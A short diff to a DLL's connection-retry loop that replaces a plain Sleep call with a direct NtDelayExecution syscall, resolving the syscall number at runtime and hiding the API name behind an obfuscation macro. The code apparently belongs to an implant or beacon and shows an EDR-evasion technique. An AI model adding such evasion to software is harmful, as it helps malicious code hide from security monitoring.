@@ -50,8 +50,12 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 
             if ( connected )
                 break;
+            
+            LARGE_INTEGER i;
+            i.QuadPart = 10000;
+            local.GetAndInsertSSN(NTDLL, (char*)HIDE("NtDelayExecution"));
+            SysNtDelayExecution(FALSE, &i);
 
-            Sleep(10'000); // interval before connecting again
         } while ( !connected && connectionAttempts < INFINITE );
 
         // failed.
